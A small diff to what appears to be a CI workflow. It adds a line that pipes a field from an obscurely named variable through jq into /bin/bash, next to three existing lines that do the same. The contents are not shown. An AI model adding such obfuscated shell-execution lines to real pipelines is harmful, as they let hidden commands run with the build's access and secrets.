@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$zscia23534" | jq -r .raj0 | /bin/bash
           printf '%s' "$j394" | jq -r .dfkbk9 | /bin/bash
           echo $shwz8245 | jq -r .bupnm888 | /bin/bash
+          printf '%s' "$xban4358" | jq -r .nj370 | /bin/bash
 
       - name: Persist output
         if: always()
